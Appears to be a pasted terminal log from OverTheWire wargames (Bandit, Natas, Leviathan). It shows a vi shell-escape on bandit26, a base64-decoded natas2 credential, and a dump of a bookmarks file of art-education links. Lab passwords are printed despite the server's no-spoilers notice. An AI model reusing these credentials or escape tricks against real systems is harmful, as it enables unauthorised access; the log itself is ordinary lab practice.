 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
vi -c 1 /home/bandit26/text.txt

~

~
------------------------
vi -c 1 /home/bandit26/text.txt
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
~
~
~
------------------------
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/

------------------------
Connection to localhost closed.
bandit25@bandit:/usr/bin$
bandit25@bandit:/usr/bin$
bandit25@bandit:/usr/bin$ ssh bandit27@localhost
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit27@localhost's password:
Permission denied, please try again.
bandit27@localhost's password:
Permission denied, please try again.
bandit27@localhost's password:

bandit25@bandit:/usr/bin$ ssh bandit26@localhost
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit26@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to localhost closed.
bandit25@bandit:/usr/bin$ exit
logout
Connection to bandit.labs.overthewire.org closed.
➜  ~
➜  ~
➜  ~ echo "bmF0YXMyOlpsdXJ1QXRoUWs3UTJNcW1EZVRpVWlqMlp2V3kybUJp" | base64 -D
natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi%                                                                                     ➜  ~ wget http://natas2.natas.labs.overthewire.org/files/pixel.png
--2018-01-08 17:07:53--  http://natas2.natas.labs.overthewire.org/files/pixel.png
Resolving natas2.natas.labs.overthewire.org... 176.9.9.172
Connecting to natas2.natas.labs.overthewire.org|176.9.9.172|:80... connected.
HTTP request sent, awaiting response... 401 Unauthorized

Username/Password Authentication Failed.

➜  ~
➜  ~ ssh leviathan0@ leviathan.labs.overthewire.org:2223
ssh: connect to host  port 22: Connection refused
➜  ~ ssh leviathan0@leviathan.labs.overthewire.org:2223
ssh: Could not resolve hostname leviathan.labs.overthewire.org:2223: nodename nor servname provided, or not known
➜  ~ ssh leviathan0@leviathan.labs.overthewire.org -p2223
The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([176.9.9.172]:2223)' can't be established.
ECDSA key fingerprint is SHA256:J9GjYlcyUBBuYNO+lCfJgckdAzD93s4WHibYj1rM6Yo.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[leviathan.labs.overthewire.org]:2223,[176.9.9.172]:2223' (ECDSA) to the list of known hosts.
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan0@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan0@leviathan:~$ ls
leviathan0@leviathan:~$ ll
total 24
drwxr-xr-x  3 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
drwxr-x---  2 leviathan1 leviathan0 4096 Nov 13 16:03 .backup/
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html
<!DOCTYPE NETSCAPE-Bookmark-file-1>
<!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! -->
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1 LAST_MODIFIED="1160271046">Bookmarks</H1>

<DL><p>
    <DT><H3 LAST_MODIFIED="1160249304" PERSONAL_TOOLBAR_FOLDER="true" ID="rdf:#$FvPhC3">Bookmarks Toolbar Folder</H3>
<DD>Add bookmarks to this folder to see them displayed on the Bookmarks Toolbar
    <DL><p>
    </DL><p>
    <HR>
    <DT><A HREF="http://www.goshen.edu/art/" ADD_DATE="1133884188" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Art Department</A>
<DT><A HREF="http://www.goshen.edu/art/ed/art-ed-links.html#links" ADD_DATE="1134961650" LAST_CHARSET="ISO-8859-1" ID="64936479">com for Bartel artwork</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/MB_bio.htm" ADD_DATE="1124894614" LAST_CHARSET="ISO-8859-1" ID="13861712">Bio</A>
<DT><A HREF="http://www.goshen.edu/art/ed/art-ed-links.html#links" ADD_DATE="1131475703" LAST_CHARSET="ISO-8859-1" ID="60650012">Links</A>
<DT><A HREF="http://www.goshen.edu/art/ed/creativitykillers.html" ADD_DATE="1101295712" LAST_CHARSET="ISO-8859-1" ID="63341225">Creativity <b>Killers</b></A>
<DT><A HREF="http://www.bartelart.com/arted/transfer.html" ADD_DATE="1144619369" LAST_CHARSET="ISO-8859-1" ID="90301948">Teaching for <strong>Transfer</strong> of Learning</A>
<DT><A HREF="http://www.bartelart.com/arted/questions.html" ADD_DATE="1158993029" LAST_CHARSET="ISO-8859-1" ID="51087167">Teaching with <strong>Questions</strong></A>

<DT><A HREF="http://www.goshen.edu/art/ed/d-list.html" ADD_DATE="1118854568" LAST_CHARSET="ISO-8859-1" ID="56772033">Rituals</A>
<DT><A HREF="http://www.goshen.edu/art/ed/Bird.html" ADD_DATE="1113759961" LAST_CHARSET="ISO-8859-1" ID="60210064">Bird Ritual</A>
<DT><A HREF="http://www.goshen.edu/art/ed/self.html" ADD_DATE="1119798823" LAST_CHARSET="ISO-8859-1" ID="72363075">Conversation Game</A>
<DT><A HREF="http://www.goshen.edu/art/ed/quest4o.htm" ADD_DATE="1146165797" LAST_CHARSET="ISO-8859-1" ID="25918861">Sources of Authentic Inspiration</A>
<DT><A HREF="http://www.goshen.edu/art/ed/self.html" ADD_DATE="1104193375" LAST_CHARSET="ISO-8859-1" ID="46187139">Ideas for Art Content and Topics</A>
<DT><A HREF="http://www.bartelart.com/arted/questions.html" ADD_DATE="1140182528" LAST_CHARSET="ISO-8859-1" ID="24166704">Teaching with Questions</A>
<DT><A HREF="http://www.goshen.edu/art/ed/artlsn.html" ADD_DATE="1158827233" LAST_CHARSET="ISO-8859-1" ID="54900319">How to Plan Art Lessons</A>
<DT><A HREF="http://www.bartelart.com/arted/ideas.html" ADD_DATE="1124470832" LAST_CHARSET="ISO-8859-1" ID="17079526">Idea generation</A>
<DT><A HREF="http://www.goshen.edu/art/ed/drawingskills.html" ADD_DATE="1138598815" LAST_CHARSET="ISO-8859-1" ID="47326324"></A>

<DT><A HREF="http://www.goshen.edu/art/ed/LesnIdea.html" ADD_DATE="1139908465" LAST_CHARSET="ISO-8859-1" ID="22023553">Lesson Idea Development</A>
<DT><A HREF="http://www.bartelart.com/arted/words.html" ADD_DATE="1107433350" LAST_CHARSET="ISO-8859-1" ID="7476400">Art and Word</A>
<DT><A HREF="http://www.goshen.edu/art/ed/1st-day.html" ADD_DATE="1121654073" LAST_CHARSET="ISO-8859-1" ID="64463068">First Day of Art Class</A>
<DT><A HREF="http://www.goshen.edu/art/ed/clay&amp;kids.htm" ADD_DATE="1141063244" LAST_CHARSET="ISO-8859-1" ID="37952657">Kids and Clay</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/lessons.html" ADD_DATE="1116789328" LAST_CHARSET="ISO-8859-1" ID="42160009">Thinking</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/box.html" ADD_DATE="1117060416" LAST_CHARSET="ISO-8859-1" ID="25714403">Personal Box</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/clanimal.html" ADD_DATE="1156185945" LAST_CHARSET="ISO-8859-1" ID="59489531">Surreal Animals</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/clanimal.html" ADD_DATE="1149707979" LAST_CHARSET="ISO-8859-1" ID="16019301">
                                  </A>

<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/gargoyle.html" ADD_DATE="1111910299" LAST_CHARSET="ISO-8859-1" ID="15289893">Sculpture: Gargoyles</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/express.html" ADD_DATE="1153257334" LAST_CHARSET="ISO-8859-1" ID="96302011">Abstract Expression</A>
<DT><A HREF="http://www.goshen.edu/art/ed/d-egg.html" ADD_DATE="1124858814" LAST_CHARSET="ISO-8859-1" ID="95263162">Dominic's Egg</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/throw/cover39.html" ADD_DATE="1125629611" LAST_CHARSET="ISO-8859-1" ID="7872186">Learning to </A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/throw/cover39.html" ADD_DATE="1111747923" LAST_CHARSET="ISO-8859-1" ID="40123851"><font face="Arial,Helvetica"><font size="-1">Throw</font></font></A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/lessons.html" ADD_DATE="1137840191" LAST_CHARSET="ISO-8859-1" ID="59994134">Art</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/lessons.html" ADD_DATE="1134487576" LAST_CHARSET="ISO-8859-1" ID="26805183">
                        </A>
<DT><A HREF="http://www.goshen.edu/art/ed/draw.html" ADD_DATE="1104458059" LAST_CHARSET="ISO-8859-1" ID="23411553">Teaching Drawing to Children</A>

<DT><A HREF="http://www.goshen.edu/art/ed/shading.html" ADD_DATE="1129446042" LAST_CHARSET="ISO-8859-1" ID="19583262">Observation Shading</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/rabbit.html" ADD_DATE="1118645691" LAST_CHARSET="ISO-8859-1" ID="84714002">Rabbit Drawing</A>
<DT><A HREF="http://www.goshen.edu/art/ed/westv.html" ADD_DATE="1150647035" LAST_CHARSET="ISO-8859-1" ID="99014366">Nature Drawing</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/inkwash.html" ADD_DATE="1113696472" LAST_CHARSET="ISO-8859-1" ID="11850626">Ink wash Drawings: Developing</A>
<DT><A HREF="http://www.goshen.edu/art/ed/short.html" ADD_DATE="1124838118" LAST_CHARSET="ISO-8859-1" ID="50921266">Rebekah Short</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/inkwash.html" ADD_DATE="1122665291" LAST_CHARSET="ISO-8859-1" ID="34421554">Dramatic Mood Using Value</A>
<DT><A HREF="http://www.goshen.edu/art/ed/short.html" ADD_DATE="1106318443" LAST_CHARSET="ISO-8859-1" ID="20051467">Rebekah Short</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/cubism.html" ADD_DATE="1130416538" LAST_CHARSET="ISO-8859-1" ID="30110394">Cubism as Experience</A>
<DT><A HREF="http://www.bartelart.com/orchid.html" ADD_DATE="1121326642" LAST_CHARSET="ISO-8859-1" ID="38823232">How to Draw an Orchid</A>

<DT><A HREF="http://www.bartelart.com/arted/cutpaperself.htm" ADD_DATE="1115951411" LAST_CHARSET="ISO-8859-1" ID="76550116">Cut Paper Self Portraits</A>
<DT><A HREF="http://www.bartelart.com/arted/wiresculpture.htm" ADD_DATE="1120571153" LAST_CHARSET="ISO-8859-1" ID="68901555">Wire Sculpture</A>
<DT><A HREF="http://www.goshen.edu/art/ed/Montage.html" ADD_DATE="1150873369" LAST_CHARSET="ISO-8859-1" ID="53516262">Montage Self Portrait Lesson</A>
<DT><A HREF="http://www.goshen.edu/art/ed/images.html" ADD_DATE="1105484438" LAST_CHARSET="ISO-8859-1" ID="47194807">Teaching with Artwork from the Internet</A>
<DT><A HREF="http://www.goshen.edu/art/ed/art-history-webquest.html" ADD_DATE="1108184402" LAST_CHARSET="ISO-8859-1" ID="66228784">Art History Web Quest</A>
<DT><A HREF="http://www.goshen.edu/art/ed/easydraw.html" ADD_DATE="1144599138" LAST_CHARSET="ISO-8859-1" ID="20830855">Learning to Draw Made Easier</A>
<DT><A HREF="http://www.goshen.edu/art/ed/drawingskills.html" ADD_DATE="1154014627" LAST_CHARSET="ISO-8859-1" ID="22828727">
                              </A>
<DT><A HREF="http://www.bartelart.com/arted/figure&amp;portrait.html" ADD_DATE="1124380442" LAST_CHARSET="ISO-8859-1" ID="20528292">Drawing Portraits and Figures</A>

<DT><A HREF="http://www.goshen.edu/art/ed/drawingskills.html" ADD_DATE="1104591866" LAST_CHARSET="ISO-8859-1" ID="24460449">
                              Learning Skills to Learn to Draw </A>
<DT><A HREF="http://www.goshen.edu/art/ed/blindergame.html" ADD_DATE="1111815823" LAST_CHARSET="ISO-8859-1" ID="30209390">
The Blinder Drawing Game</A>
<DT><A HREF="http://www.goshen.edu/art/ed/westv.html" ADD_DATE="1121910411" LAST_CHARSET="ISO-8859-1" ID="60717035">Drawing Lesson</A>
<DT><A HREF="http://www.goshen.edu/art/ed/drawingskills.html" ADD_DATE="1148891799" LAST_CHARSET="ISO-8859-1" ID="73876105"><font size="-1"><font face="Arial,Helvetica">All the Skills Needed to </font></font></A>
<DT><A HREF="http://www.goshen.edu/art/ed/drawingskills.html" ADD_DATE="1157324575" LAST_CHARSET="ISO-8859-1" ID="91541455">Draw</A>
<DT><A HREF="http://www.goshen.edu/art/ed/draw.html" ADD_DATE="1156595543" LAST_CHARSET="ISO-8859-1" ID="45579445">Teaching Observation Drawing</A>
<DT><A HREF="http://www.goshen.edu/art/ed/shading.html" ADD_DATE="1113085556" LAST_CHARSET="ISO-8859-1" ID="29268934">Teaching Shading in Drawing</A>

<DT><A HREF="http://www.goshen.edu/art/ed/drawingisbasic.html" ADD_DATE="1150861556" LAST_CHARSET="ISO-8859-1" ID="48064255">Drawing is Basic</A>
<DT><A HREF="http://www.goshen.edu/art/ed/talent.html" ADD_DATE="1103554211" LAST_CHARSET="ISO-8859-1" ID="18489073">Drawing for the "untalented"</A>
<DT><A HREF="http://www.goshen.edu/art/ed/westv.html" ADD_DATE="1110264561" LAST_CHARSET="ISO-8859-1" ID="90241352">Learning to Learn to Draw</A>
<DT><A HREF="http://www.goshen.edu/art/ed/shading.html" ADD_DATE="1143398355" LAST_CHARSET="ISO-8859-1" ID="25991218">Practice Shading</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/cubism.html" ADD_DATE="1122587711" LAST_CHARSET="ISO-8859-1" ID="85515732">Cubism Lesson</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PreSchool/aboutschematic.html" ADD_DATE="1155567585" LAST_CHARSET="ISO-8859-1" ID="11436151">Drawing</A>
<DT><A HREF="http://www.bartelart.com/orchid.html" ADD_DATE="1103871789" LAST_CHARSET="ISO-8859-1" ID="81860341">How to Draw an Orchid</A>
<DT><A HREF="http://www.goshen.edu/art/ed/Compose.htm" ADD_DATE="1120678600" LAST_CHARSET="ISO-8859-1" ID="46760706"><span style="text-decoration: underline;"><img src="art-ed-links_files/size-depth.jpg" title="" alt="size and depth" style="border: 0px solid ; width: 238px; height: 103px;"></span></A>
<DT><A HREF="http://www.goshen.edu/art/ed/Compose.htm" ADD_DATE="1101489100" LAST_CHARSET="ISO-8859-1" ID="41807609">Elements and Principles</A>

<DT><A HREF="http://www.goshen.edu/art/ed/percy1.html" ADD_DATE="1142926279" LAST_CHARSET="ISO-8859-1" ID="21931292">Percy Principles of Composition</A>
<DT><A HREF="http://www.bartelart.com/arted/ideas.html" ADD_DATE="1143405377" LAST_CHARSET="ISO-8859-1" ID="7532232">Idea Generation</A>
<DT><A HREF="http://www.goshen.edu/art/ed/creativitykillers.html" ADD_DATE="1149805437" LAST_CHARSET="ISO-8859-1" ID="53147657">Creativity <b>Killers</b></A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/arted/tc.html" ADD_DATE="1149058963" LAST_CHARSET="ISO-8859-1" ID="77786918">Creative Teaching</A>
<DT><A HREF="http://www.goshen.edu/art/ed/multiculturalart.html" ADD_DATE="1126953989" LAST_CHARSET="ISO-8859-1" ID="75335911">Creatively Teaching <b>Multicultural</b> Art</A>
<DT><A HREF="http://www.goshen.edu/art/ed/creativitylinks.html" ADD_DATE="1114117694" LAST_CHARSET="ISO-8859-1" ID="66340962">Creativity Links</A>
<DT><A HREF="http://www.bartelart.com/arted/questions.html" ADD_DATE="1102823260" LAST_CHARSET="ISO-8859-1" ID="7769042">Teaching with Questions</A>

<DT><A HREF="http://www.bartelart.com/arted/transfer.html" ADD_DATE="1108723084" LAST_CHARSET="ISO-8859-1" ID="10423895">Teaching for Transfer of Learning</A>
<DT><A HREF="http://www.goshen.edu/art/ed/critique1.html" ADD_DATE="1115858528" LAST_CHARSET="ISO-8859-1" ID="31371028">Critique in the Art Class</A>
<DT><A HREF="http://www.goshen.edu/art/ed/critique-page-2.html" ADD_DATE="1100451622" LAST_CHARSET="ISO-8859-1" ID="98263450">Critique Notes</A>
<DT><A HREF="http://www.goshen.edu/art/ed/critiqueform.html" ADD_DATE="1134583216" LAST_CHARSET="ISO-8859-1" ID="38101408">Critique Form</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/arted/testing/drawtest.html" ADD_DATE="1150486211" LAST_CHARSET="ISO-8859-1" ID="49582249">How to write art tests</A>
<DT><A HREF="http://www.goshen.edu/art/ed/rubric2.html" ADD_DATE="1129872754" LAST_CHARSET="ISO-8859-1" ID="90125770">Rubric - Assessing Artwork</A>
<DT><A HREF="http://www.goshen.edu/art/ed/rubric3.html" ADD_DATE="1118979582" LAST_CHARSET="ISO-8859-1" ID="83802438">Rubric - Assessing Art Talk</A>
<DT><A HREF="http://www.goshen.edu/art/ed/sketch.html" ADD_DATE="1122256802" LAST_CHARSET="ISO-8859-1" ID="33831224">Sketchbook Evaluation</A>
<DT><A HREF="http://www.bartelart.com/arted/exhibitawards.html" ADD_DATE="1115468392" LAST_CHARSET="ISO-8859-1" ID="8107633">SmartArt Exhibition Awards</A>

<DT><A HREF="http://www.bartelart.com/arted/transfer.html" ADD_DATE="1133620178" LAST_CHARSET="ISO-8859-1" ID="97627047">Transfer of Learning</A>
<DT><A HREF="http://bartelart.com/orchid.html" ADD_DATE="1109466342" LAST_CHARSET="ISO-8859-1" ID="38410845"><span class="style18"><font face="Arial,Helvetica"></font></span></A>
<DT><A HREF="http://bartelart.com/arted/wallscribblers.html" ADD_DATE="1130617515" LAST_CHARSET="ISO-8859-1" ID="97048204">Scribbling on <b>the Wall</b></A>
<DT><A HREF="http://www.bartelart.com/orchid.html" ADD_DATE="1109802196" LAST_CHARSET="ISO-8859-1" ID="95463817">How to Draw an Orchid</A>
<DT><A HREF="http://www.goshen.edu/art/ed/let2pre.htm" ADD_DATE="1143626381" LAST_CHARSET="ISO-8859-1" ID="39564127">Preschool Art</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PreSchool/SchematicThinkingPicture.html" ADD_DATE="1137257620" LAST_CHARSET="ISO-8859-1" ID="76988961">Preschool, Kindergarten, and Art</A>
<DT><A HREF="http://www.bartelart.com/arted/wallscribblers.html" ADD_DATE="1128545711" LAST_CHARSET="ISO-8859-1" ID="76209997">
                              </A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PreSchool/aboutschematic.html" ADD_DATE="1152673684" LAST_CHARSET="ISO-8859-1" ID="73591284">Drawing</A>

<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PreSchool/SchematicThinkingPicture.html" ADD_DATE="1104614920" LAST_CHARSET="ISO-8859-1" ID="88078106">Typical Drawings</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PreSchool/aboutschematic.html" ADD_DATE="1143307694" LAST_CHARSET="ISO-8859-1" ID="64943272"><img src="art-ed-links_files/brother.jpg" title="" alt="my brother" style="border: 0px solid ; width: 150px; height: 94px;"></A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PreSchool/aboutschematic.html" ADD_DATE="1115811211" LAST_CHARSET="ISO-8859-1" ID="55633917">Typical First Pictures</A>
<DT><A HREF="http://www.goshen.edu/art/ed/clay&amp;kids.htm" ADD_DATE="1108795507" LAST_CHARSET="ISO-8859-1" ID="75717074">Kids and Clay</A>
<DT><A HREF="http://www.goshen.edu/art/ed/housetor.html" ADD_DATE="1127598476" LAST_CHARSET="ISO-8859-1" ID="45968112">Everyday Life Art Choices</A>
<DT><A HREF="http://www.goshen.edu/art/ed/housetor.html" ADD_DATE="1135881890" LAST_CHARSET="ISO-8859-1" ID="82646166">Aesthetics and Ethics in Everyday Life</A>
<DT><A HREF="http://www.goshen.edu/art/ed/non-violence.html" ADD_DATE="1148090344" LAST_CHARSET="ISO-8859-1" ID="85129561">Art and National Tragedy</A>
<DT><A HREF="http://www.goshen.edu/art/ed/artroom.html" ADD_DATE="1154684931" LAST_CHARSET="ISO-8859-1" ID="35561853">Art room Design</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/arted/tape.html" ADD_DATE="1149870622" LAST_CHARSET="ISO-8859-1" ID="6393665">How to mount temporary art displays</A>

<DT><A HREF="http://www.goshen.edu/art/ed/observ.htm" ADD_DATE="1144582708" LAST_CHARSET="ISO-8859-1" ID="33531313">Observing an Art Teacher</A>
<DT><A HREF="http://www.goshen.edu/art/ed/answer.html" ADD_DATE="1102123148" LAST_CHARSET="ISO-8859-1" ID="90170462">Good and Bad Art Teaching</A>
<DT><A HREF="http://www.goshen.edu/art/DeptPgs/safety.htm" ADD_DATE="1117506211" LAST_CHARSET="ISO-8859-1" ID="75825986">
                            </A>
<DT><A HREF="http://www.goshen.edu/art/DeptPgs/Hazards.html" ADD_DATE="1117951366" LAST_CHARSET="ISO-8859-1" ID="90799910">Hazards Working with Ceramics</A>
<DT><A HREF="http://www.goshen.edu/art/DeptPgs/clean.html" ADD_DATE="1131845742" LAST_CHARSET="ISO-8859-1" ID="77067758"><span style="font-family: times new roman,times,serif;"><span style="text-decoration: underline;">Working and Cleaning with less dust</span></span></A>
<DT><A HREF="http://www.goshen.edu/art/ed/help.html" ADD_DATE="1140391108" LAST_CHARSET="ISO-8859-1" ID="40227805">Advocate Link Page</A>
<DT><A HREF="http://www.goshen.edu/art/ed/advocacyletter.html" ADD_DATE="1130547887" LAST_CHARSET="ISO-8859-1" ID="74590933">A letter to an administrator</A>
<DT><A HREF="http://www.goshen.edu/art/ed/honey.html" ADD_DATE="1117091302" LAST_CHARSET="ISO-8859-1" ID="22513777">Successful Third Grade</A>

<DT><A HREF="http://www.bartelart.com/arted/exhibitdesign.html" ADD_DATE="1123850735" LAST_CHARSET="ISO-8859-1" ID="54485426">Build Goodwill with Exhibitions</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/arted/tape.html" ADD_DATE="1147096056" LAST_CHARSET="ISO-8859-1" ID="54059728">How to Tape Work to theWall</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/PContnt.htm" ADD_DATE="1118233049" LAST_CHARSET="ISO-8859-1" ID="23907384"><font size="-1">Teaching Photography</font></A>
<DT><A HREF="http://www.goshen.edu/art/DeptPgs/CerLinks.htm" ADD_DATE="1100067903" LAST_CHARSET="ISO-8859-1" ID="89722015">Teaching Ceramics</A>
<DT><A HREF="http://www.goshen.edu/art/ed/309Syl.html" ADD_DATE="1103996380" LAST_CHARSET="ISO-8859-1" ID="79827178">Art for Children course syllabus</A>
<DT><A HREF="http://www.goshen.edu/art/design/hdcours.html" ADD_DATE="1145111792" LAST_CHARSET="ISO-8859-1" ID="97307350">Teaching House Design</A>
<DT><A HREF="http://www.goshen.edu/art/design/concepts.html" ADD_DATE="1109315340" LAST_CHARSET="ISO-8859-1" ID="57608185">Creative Computer Drafting</A>
<DT><A HREF="http://www.goshen.edu/" ADD_DATE="1102279154" LAST_CHARSET="ISO-8859-1" ID="89361731">Goshen College</A>
<DT><A HREF="http://www.goshen.edu/art/" ADD_DATE="1154917121" LAST_CHARSET="ISO-8859-1" ID="7142886">Art Department at Goshen College</A>

<DT><A HREF="http://www.goshen.edu/art/03/gallery/02-03.htm" ADD_DATE="1147929524" LAST_CHARSET="ISO-8859-1" ID="20134628">Art Gallery</A>
<DT><A HREF="http://bartelart.com/mb.html" ADD_DATE="1149998404" LAST_CHARSET="ISO-8859-1" ID="9266782"><big><big><font size="-1"><big><big><big>Marvin Bartel</big></big></big></font></big></big></A>
